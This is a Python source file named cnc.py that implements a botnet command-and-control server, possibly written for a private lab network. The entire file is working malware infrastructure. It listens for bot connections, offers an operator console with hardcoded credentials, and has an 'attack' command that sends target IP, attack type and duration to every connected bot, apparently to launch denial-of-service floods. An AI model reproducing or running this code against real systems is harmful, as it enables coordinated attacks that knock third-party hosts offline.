# cnc.py
import socket
import threading
import requests
import time

REPORT_SERVER = "http://10.10.10.100:5000"

CNC_IP = "0.0.0.0" #"10.10.10.100"
CNC_PORT = 5002
CNC_PORT_TO_ATTACKER = 5003


ATTACKER_USER = "dead"
ATTACKER_PASS = "beef"

bots = []

# BOt handle
def handle_bot(conn, addr):
    print(f"[+] Bot connected from {addr}")
    bots.append(conn)

    try:
        while True:
            data = conn.recv(1024)

            if not data:
                break

            print(f"[BOT {addr}] {data.decode().strip()}")

    except Exception as e:
        print(f"[-] Bot error: {e}")

    finally:
        print(f"[-] Bot disconnected {addr}")
        bots.remove(conn)
        conn.close()


def start_server():
    s = socket.socket()
    s.bind((CNC_IP, CNC_PORT))
    s.listen()

    print(f"[CNC] Listening on {CNC_IP}:{CNC_PORT}")

    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_bot, args=(conn, addr), daemon=True).start()


# LOGIN 
def handle_attacker(conn):
    conn.send(b"Username: ")
    user = conn.recv(1024).decode().strip()

    conn.send(b"Password: ")
    pwd = conn.recv(1024).decode().strip()

    if user != ATTACKER_USER or pwd != ATTACKER_PASS:
        conn.send(b"Login failed\n")
        conn.close()
        return

    conn.send(b"CNC access granted\n")

    while True:
        conn.send(b"> ")
        cmd = conn.recv(1024).decode().strip()

        if cmd == "list":
            conn.send(f"Bots: {len(bots)}\n".encode())

        elif cmd.startswith("attack"):
            parts = cmd.split()
            if len(parts) < 2:
                conn.send(b"Usage: attack <ip>\n")
                continue

            target = parts[1]
            type_att = 1
            duration = 10
            print(target, type_att, duration)

            if len(parts) == 3:
                type_att= parts[2]
            elif len(parts) == 4:
                type_att=parts[2]
                duration = parts[3]

            for bot in bots:
                try:
                    bot.sendall(f"ATT {target} {type_att} {duration}\n".encode())
                    print(f"ATT {target} {type_att} {duration}\n")
                    #bot.send(f"ATT {target} {att_type} {duration}\n".encode())
                except Exception as e:
                    print(f"Sending error: {e}")

            conn.send(b"Attack sent\n")

        elif cmd == "exit":
            break

    conn.close()

def start_attacker_server():
    s = socket.socket()
    s.bind((CNC_IP,CNC_PORT_TO_ATTACKER))
    s.listen()
    
    print("listening on 5003")
    while True:
        conn,_ = s.accept()
        threading.Thread(target=handle_attacker, args=(conn,), daemon= True).start()



if __name__ == "__main__":
    threading.Thread(target=start_server, daemon = True).start()

    threading.Thread(target=start_attacker_server, daemon = True).start()
    #start_server()

    while True:
        time.sleep(1)
